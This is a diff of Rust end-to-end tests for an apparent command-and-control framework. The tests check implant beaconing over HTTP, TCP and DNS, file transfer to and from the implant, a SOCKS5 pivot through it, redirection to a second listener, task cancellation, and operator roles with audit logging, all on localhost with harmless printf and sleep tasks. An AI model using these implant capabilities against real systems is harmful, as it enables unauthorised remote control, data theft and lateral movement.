@@ -3,8 +3,8 @@
 //! the result comes back over the real HTTP channel.
 
 use std::io::{Read, Write};
-use std::sync::atomic::{AtomicUsize, Ordering};
 use std::sync::Arc;
+use std::sync::atomic::{AtomicUsize, Ordering};
 use std::time::Duration;
 
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
@@ -18,7 +18,11 @@ use nw_implant::runtime::{BeaconRuntime, Profile};
 use nw_server::{ServerState, queue::TaskQueue, server, session::SessionRegistry};
 
 fn free_port() -> u16 {
-    std::net::TcpListener::bind("127.0.0.1:0").unwrap().local_addr().unwrap().port()
+    std::net::TcpListener::bind("127.0.0.1:0")
+        .unwrap()
+        .local_addr()
+        .unwrap()
+        .port()
 }
 
 #[tokio::test]
@@ -32,7 +36,13 @@ async fn http_c2_round_trip() {
 
     let registry = Arc::new(SessionRegistry::new());
     let queue = Arc::new(TaskQueue::new());
-    let state = ServerState { registry: registry.clone(), queue: queue.clone(), psk: Arc::new(psk.clone()), files: nw_server::filestore::FileStore::default(), uploads: nw_server::uploadstore::UploadStore::default() };
+    let state = ServerState {
+        registry: registry.clone(),
+        queue: queue.clone(),
+        psk: Arc::new(psk.clone()),
+        files: nw_server::filestore::FileStore::default(),
+        uploads: nw_server::uploadstore::UploadStore::default(),
+    };
 
     let bind = format!("127.0.0.1:{}", port);
     let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
@@ -57,23 +67,31 @@ async fn http_c2_round_trip() {
 
     // The implant registers on its first tick; give it time, then queue a task.
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
     let task_id = queue
         .push(&sid, "printf".into(), vec!["roundtrip-ok".into()], 5000)
+        .await
         .expect("queued");
 
     // Poll the queue until the result is delivered by the implant.
     let mut waited = Duration::ZERO;
     let result = loop {
-        if let Some(r) = queue.take_result(&sid, &task_id) {
+        if let Some(r) = queue.take_result(&sid, &task_id).await {
             break r;
         }
-        assert!(waited < Duration::from_secs(10), "timed out waiting for task result");
+        assert!(
+            waited < Duration::from_secs(10),
+            "timed out waiting for task result"
+        );
         tokio::time::sleep(Duration::from_millis(100)).await;
         waited += Duration::from_millis(100);
     };
 
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
     assert_eq!(String::from_utf8_lossy(&result.stdout), "roundtrip-ok");
 
     // Stop the implant, then drop the server.
@@ -130,13 +148,23 @@ async fn download_streams_a_remote_file_to_the_server() {
     let beacon = tokio::spawn(async move { implanted.run().await });
 
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
     let task_id = queue
-        .push(&sid, "nw/download".into(), vec![src.to_str().unwrap().to_string()], 60_000)
+        .push(
+            &sid,
+            "nw/download".into(),
+            vec![src.to_str().unwrap().to_string()],
+            60_000,
+        )
+        .await
         .expect("queued");
 
     let result = wait_for_result(&queue, &sid, &task_id).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
     assert!(String::from_utf8_lossy(&result.stdout).contains("downloaded"));
 
     // The server should have the full file under its downloads dir.
@@ -185,7 +213,12 @@ async fn upload_streams_a_local_file_to_the_implant() {
 
     // The operator uses a Dispatch over the SAME queue/uploads so the upload job
     // lands where the server's poll handler reads it.
-    let dispatcher = nw_server::Dispatcher::new(registry.clone(), queue.clone(), uploads);
+    let sys_op = nw_server::operators::Operator {
+        id: uuid::Uuid::nil(),
+        username: "system".into(),
+        role: nw_server::operators::Role::Admin,
+    };
+    let dispatcher = nw_server::Dispatcher::new(registry.clone(), queue.clone(), uploads, sys_op);
 
     let profile = Profile {
         endpoint: endpoint.clone(),
@@ -203,23 +236,33 @@ async fn upload_streams_a_local_file_to_the_implant() {
     let beacon = tokio::spawn(async move { implanted.run().await });
 
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
     dispatcher.set_interacted(Some(sid));
-    let queued = match dispatcher.parse(&format!(
-        "upload {} {}",
-        src.to_str().unwrap(),
-        dest.to_str().unwrap()
-    )) {
+    let queued = match dispatcher
+        .parse(&format!(
+            "upload {} {}",
+            src.to_str().unwrap(),
+            dest.to_str().unwrap()
+        ))
+        .await
+    {
         nw_server::dispatch::Outcome::TaskQueued { task_id, .. } => task_id,
         other => panic!("upload not queued: {other:?}"),
     };
 
     let result = wait_for_result(queue.as_ref(), &sid, &queued).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
     assert!(String::from_utf8_lossy(&result.stdout).contains("uploaded"));
 
     let written = std::fs::read(&dest).unwrap_or_default();
-    assert_eq!(written, payload, "implant-side file must match the pushed source");
+    assert_eq!(
+        written, payload,
+        "implant-side file must match the pushed source"
+    );
 
     runtime.trigger_stop();
     let _ = beacon.await;
@@ -276,26 +319,51 @@ async fn socks5_proxy_relays_traffic_through_the_implant() {
     let beacon = tokio::spawn(async move { implanted.run().await });
 
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
 
     let socks_port = free_port();
     let task_id = queue
-        .push(&sid, "nw/socks".into(), vec![socks_port.to_string()], 10_000)
+        .push(
+            &sid,
+            "nw/socks".into(),
+            vec![socks_port.to_string()],
+            10_000,
+        )
+        .await
         .expect("queued socks");
     let result = wait_for_result(&queue, &sid, &task_id).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
 
     // Drive the implant's SOCKS5 proxy like a real client: no-auth handshake,
     // then CONNECT to the echo target, relay one message.
     let mut client = std::net::TcpStream::connect(("127.0.0.1", socks_port)).unwrap();
-    client.set_read_timeout(Some(Duration::from_secs(5))).unwrap();
-    client.set_write_timeout(Some(Duration::from_secs(5))).unwrap();
+    client
+        .set_read_timeout(Some(Duration::from_secs(5)))
+        .unwrap();
+    client
+        .set_write_timeout(Some(Duration::from_secs(5)))
+        .unwrap();
     client.write_all(&[0x05, 0x01, 0x00]).unwrap();
     let mut h = [0u8; 2];
     client.read_exact(&mut h).unwrap();
     assert_eq!(h, [0x05, 0x00]);
     client
-        .write_all(&[0x05, 0x01, 0x00, 0x01, 127, 0, 0, 1, (echo_port >> 8) as u8, (echo_port & 0xff) as u8])
+        .write_all(&[
+            0x05,
+            0x01,
+            0x00,
+            0x01,
+            127,
+            0,
+            0,
+            1,
+            (echo_port >> 8) as u8,
+            (echo_port & 0xff) as u8,
+        ])
         .unwrap();
     let mut ack = [0u8; 10];
     client.read_exact(&mut ack).unwrap();
@@ -349,7 +417,7 @@ async fn hashes_returns_sha256_of_a_remote_file() {
     let beacon = tokio::spawn(async move { implanted.run().await });
 
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
 
     // A file on the "implant" (same process in this e2e) with known bytes.
     let data = b"hello from naughtywolf hashes test\n";
@@ -359,10 +427,20 @@ async fn hashes_returns_sha256_of_a_remote_file() {
     std::fs::write(&path, data).unwrap();
 
     let task_id = queue
-        .push(&sid, "nw/hashes".into(), vec![path.to_str().unwrap().into()], 30_000)
+        .push(
+            &sid,
+            "nw/hashes".into(),
+            vec![path.to_str().unwrap().into()],
+            30_000,
+        )
+        .await
         .expect("queued hashes");
     let result = wait_for_result(&queue, &sid, &task_id).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
 
     use sha2::{Digest, Sha256};
     let mut h = Sha256::new();
@@ -394,8 +472,10 @@ async fn redirect_delivers_its_result_to_the_second_listener() {
         register_ready: Arc::new(tokio::sync::Notify::new()),
         release_register: Arc::new(tokio::sync::Notify::new()),
     };
-    let first_app = nw_server::channels::router(registry.clone(), queue.clone(), psk.clone())
-        .layer(axum::middleware::from_fn_with_state(first.clone(), reject_followup_polls));
+    let first_app =
+        nw_server::channels::router(registry.clone(), queue.clone(), psk.clone()).layer(
+            axum::middleware::from_fn_with_state(first.clone(), reject_followup_polls),
+        );
     let first_bind = format!("127.0.0.1:{}", first_port);
     let first_listener = tokio::net::TcpListener::bind(&first_bind).await.unwrap();
     let first_handle = tokio::spawn(async move { axum::serve(first_listener, first_app).await });
@@ -408,7 +488,8 @@ async fn redirect_delivers_its_result_to_the_second_listener() {
         uploads: nw_server::uploadstore::UploadStore::default(),
     };
     let second_bind = format!("127.0.0.1:{}", second_port);
-    let second_handle = tokio::spawn(async move { server::serve(second_state, &second_bind).await });
+    let second_handle =
+        tokio::spawn(async move { server::serve(second_state, &second_bind).await });
 
     let profile = Profile {
         endpoint: first_endpoint,
@@ -428,14 +509,24 @@ async fn redirect_delivers_its_result_to_the_second_listener() {
     tokio::time::timeout(Duration::from_secs(3), first.register_ready.notified())
         .await
         .expect("register did not reach the first listener");
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
     let task_id = queue
-        .push(&sid, "nw/sethost".into(), vec![second_endpoint.clone()], 5000)
+        .push(
+            &sid,
+            "nw/sethost".into(),
+            vec![second_endpoint.clone()],
+            5000,
+        )
+        .await
         .expect("queued redirect");
     first.release_register.notify_one();
 
     let result = wait_for_result(&queue, &sid, &task_id).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
     assert!(String::from_utf8_lossy(&result.stdout).contains(&second_endpoint));
     assert_eq!(first.polls.load(Ordering::SeqCst), 1);
 
@@ -477,20 +568,27 @@ async fn reject_followup_polls(
 
 async fn wait_for_session(registry: &SessionRegistry) {
     let mut waited = Duration::ZERO;
-    while registry.list().is_empty() {
+    while registry.list().await.is_empty() {
         assert!(waited < Duration::from_secs(10), "implant never registered");
         tokio::time::sleep(Duration::from_millis(100)).await;
         waited += Duration::from_millis(100);
     }
 }
 
-async fn wait_for_result(queue: &TaskQueue, sid: &uuid::Uuid, task_id: &uuid::Uuid) -> nw_profile::msgs::TaskResult {
+async fn wait_for_result(
+    queue: &TaskQueue,
+    sid: &uuid::Uuid,
+    task_id: &uuid::Uuid,
+) -> nw_profile::msgs::TaskResult {
     let mut waited = Duration::ZERO;
     loop {
-        if let Some(result) = queue.take_result(sid, task_id) {
+        if let Some(result) = queue.take_result(sid, task_id).await {
             return result;
         }
-        assert!(waited < Duration::from_secs(3), "timed out waiting for task result");
+        assert!(
+            waited < Duration::from_secs(3),
+            "timed out waiting for task result"
+        );
         tokio::time::sleep(Duration::from_millis(50)).await;
         waited += Duration::from_millis(50);
     }
@@ -536,13 +634,18 @@ async fn raw_tcp_c2_round_trip() {
     let beacon = tokio::spawn(async move { implanted.run().await });
 
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
     let task_id = queue
         .push(&sid, "printf".into(), vec!["tcp-roundtrip-ok".into()], 5000)
+        .await
         .expect("queued");
 
     let result = wait_for_result(&queue, &sid, &task_id).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
     assert_eq!(String::from_utf8_lossy(&result.stdout), "tcp-roundtrip-ok");
 
     runtime.trigger_stop();
@@ -587,16 +690,258 @@ async fn raw_dns_c2_round_trip() {
     let beacon = tokio::spawn(async move { implanted.run().await });
 
     wait_for_session(&registry).await;
-    let sid = registry.list()[0].id;
+    let sid = registry.list().await[0].id;
     let task_id = queue
         .push(&sid, "printf".into(), vec!["dns-roundtrip-ok".into()], 5000)
+        .await
         .expect("queued");
 
     let result = wait_for_result(&queue, &sid, &task_id).await;
-    assert!(result.ok, "stderr: {}", String::from_utf8_lossy(&result.stderr));
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
     assert_eq!(String::from_utf8_lossy(&result.stdout), "dns-roundtrip-ok");
 
     runtime.trigger_stop();
     let _ = beacon.await;
     server_handle.abort();
+}
+
+#[tokio::test]
+async fn killjob_cancels_an_in_flight_task() {
+    let _ = tracing_subscriber::fmt()
+        .with_max_level(tracing::Level::INFO)
+        .try_init();
+    let psk: Vec<u8> = b"kill-e2e-psk".to_vec();
+    let port = free_port();
+    let endpoint = format!("http://127.0.0.1:{}", port);
+
+    let registry = Arc::new(SessionRegistry::new());
+    let queue = Arc::new(TaskQueue::new());
+    let state = ServerState {
+        registry: registry.clone(),
+        queue: queue.clone(),
+        psk: Arc::new(psk.clone()),
+        files: nw_server::filestore::FileStore::default(),
+        uploads: nw_server::uploadstore::UploadStore::default(),
+    };
+
+    let bind = format!("127.0.0.1:{}", port);
+    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
+    tokio::time::sleep(Duration::from_millis(200)).await;
+
+    let profile = Profile {
+        endpoint: endpoint.clone(),
+        interval: Duration::from_millis(100),
+        jitter: Duration::ZERO,
+        hostname: "killlab".into(),
+        username: "tester".into(),
+        os: "test-os".into(),
+        arch: "test-arch".into(),
+        pid: 999,
+        addr: "127.0.0.1".into(),
+    };
+    let runtime = Arc::new(BeaconRuntime::new(profile, psk));
+    let implanted = runtime.clone();
+    let beacon = tokio::spawn(async move { implanted.run().await });
+
+    wait_for_session(&registry).await;
+    let sid = registry.list().await[0].id;
+
+    // Queue a long-running task; once Delivered it is in-flight on the implant.
+    let victim = queue
+        .push(&sid, "sleep".into(), vec!["30".into()], 60_000)
+        .await
+        .expect("queued");
+    let mut waited = Duration::ZERO;
+    while queue.status(&sid, &victim).await != Some(nw_server::queue::TaskStatus::Delivered) {
+        assert!(
+            waited < Duration::from_secs(10),
+            "long task never delivered"
+        );
+        tokio::time::sleep(Duration::from_millis(50)).await;
+        waited += Duration::from_millis(50);
+    }
+
+    // Queue the kill; expect a result reporting the child was terminated.
+    let kill_tid = queue
+        .push(&sid, "nw/killtask".into(), vec![victim.to_string()], 10_000)
+        .await
+        .expect("queued");
+    let result = wait_for_result(&queue, &sid, &kill_tid).await;
+    eprintln!(
+        "kill result: ok={} stdout={:?} stderr={:?}",
+        result.ok,
+        String::from_utf8_lossy(&result.stdout),
+        String::from_utf8_lossy(&result.stderr)
+    );
+    assert!(
+        result.ok,
+        "stderr: {}",
+        String::from_utf8_lossy(&result.stderr)
+    );
+
+    runtime.trigger_stop();
+    let _ = beacon.await;
+    server_handle.abort();
+}
+
+#[tokio::test]
+async fn m2_auth_audit_and_restart_persistence() {
+    let dir = tempfile::tempdir().unwrap();
+    let db = dir.path().join("m2.sqlite");
+    let pool = nw_server::persist::open_pool(db.to_str().unwrap())
+        .await
+        .unwrap();
+    let registry = Arc::new(SessionRegistry::with_sqlite(pool.clone()));
+    let queue = Arc::new(TaskQueue::with_sqlite(pool.clone()));
+    let operators = nw_server::operators::OperatorStore::new(pool.clone());
+    operators
+        .create("admin", "admin-password", nw_server::operators::Role::Admin)
+        .await
+        .unwrap();
+    operators
+        .create(
+            "viewer",
+            "viewer-password",
+            nw_server::operators::Role::Viewer,
+        )
+        .await
+        .unwrap();
+    let admin = operators
+        .authenticate("admin", "admin-password")
+        .await
+        .unwrap();
+    let viewer = operators
+        .authenticate("viewer", "viewer-password")
+        .await
+        .unwrap();
+    let audit = Arc::new(nw_server::audit_log::AuditLog::new(pool.clone()));
+
+    let psk = b"m2-e2e-psk".to_vec();
+    let port = free_port();
+    let endpoint = format!("http://127.0.0.1:{port}");
+    let state = ServerState {
+        registry: registry.clone(),
+        queue: queue.clone(),
+        psk: Arc::new(psk.clone()),
+        files: nw_server::filestore::FileStore::default(),
+        uploads: nw_server::uploadstore::UploadStore::default(),
+    };
+    let bind = format!("127.0.0.1:{port}");
+    let server_handle = tokio::spawn(async move { server::serve(state, &bind).await });
+    tokio::time::sleep(Duration::from_millis(100)).await;
+
+    let profile = Profile {
+        endpoint,
+        interval: Duration::from_millis(50),
+        jitter: Duration::from_millis(10),
+        hostname: "m2-host".into(),
+        username: "tester".into(),
+        os: "test-os".into(),
+        arch: "test-arch".into(),
+        pid: 2026,
+        addr: "127.0.0.1".into(),
+    };
+    let runtime = Arc::new(BeaconRuntime::new(profile, psk));
+    let implanted = runtime.clone();
+    let beacon = tokio::spawn(async move { implanted.run().await });
+
+    wait_for_session(&registry).await;
+    let sid = registry.list().await[0].id;
+
+    let viewer_dispatcher = nw_server::Dispatcher::new(
+        registry.clone(),
+        queue.clone(),
+        nw_server::uploadstore::UploadStore::default(),
+        viewer,
+    )
+    .with_audit(audit.clone());
+    viewer_dispatcher.set_interacted(Some(sid));
+    assert!(matches!(
+        viewer_dispatcher.parse("shell printf forbidden").await,
+        nw_server::Outcome::Error(_)
+    ));
+
+    let admin_dispatcher = nw_server::Dispatcher::new(
+        registry.clone(),
+        queue.clone(),
+        nw_server::uploadstore::UploadStore::default(),
+        admin,
+    )
+    .with_audit(audit.clone());
+    assert!(matches!(
+        admin_dispatcher.parse(&format!("interact {sid}")).await,
+        nw_server::Outcome::Local { .. }
+    ));
+    let task_id = match admin_dispatcher.parse("shell printf m2-complete").await {
+        nw_server::Outcome::TaskQueued { task_id, role, .. } => {
+            assert_eq!(role, nw_server::operators::Role::Admin);
+            task_id
+        }
+        other => panic!("shell task was not queued: {other:?}"),
+    };
+
+    let mut waited = Duration::ZERO;
+    while queue.status(&sid, &task_id).await != Some(nw_server::queue::TaskStatus::Completed) {
+        assert!(waited < Duration::from_secs(10), "M2 task never completed");
+        tokio::time::sleep(Duration::from_millis(50)).await;
+        waited += Duration::from_millis(50);
+    }
+
+    runtime.trigger_stop();
+    let _ = beacon.await;
+    server_handle.abort();
+    let _ = server_handle.await;
+    drop(viewer_dispatcher);
+    drop(admin_dispatcher);
+    drop(audit);
+    drop(operators);
+    drop(queue);
+    drop(registry);
+    pool.close().await;
+
+    let restarted_pool = nw_server::persist::open_pool(db.to_str().unwrap())
+        .await
+        .unwrap();
+    let restarted_registry = SessionRegistry::with_sqlite(restarted_pool.clone());
+    let restarted_queue = TaskQueue::with_sqlite(restarted_pool.clone());
+    let restarted_operators = nw_server::operators::OperatorStore::new(restarted_pool.clone());
+    let restarted_audit = nw_server::audit_log::AuditLog::new(restarted_pool);
+
+    assert_eq!(
+        restarted_registry.get(&sid).await.unwrap().hostname,
+        "m2-host"
+    );
+    assert_eq!(
+        restarted_queue.status(&sid, &task_id).await,
+        Some(nw_server::queue::TaskStatus::Completed)
+    );
+    assert_eq!(
+        restarted_queue
+            .take_result(&sid, &task_id)
+            .await
+            .unwrap()
+            .stdout,
+        b"m2-complete"
+    );
+    assert!(
+        restarted_operators
+            .authenticate("admin", "admin-password")
+            .await
+            .is_some()
+    );
+    let entries = restarted_audit.list(20).await;
+    assert!(
+        entries
+            .iter()
+            .any(|entry| entry.action == "task.shell" && entry.succeeded)
+    );
+    assert!(
+        entries
+            .iter()
+            .any(|entry| entry.action == "task.shell" && !entry.succeeded)
+    );
 }
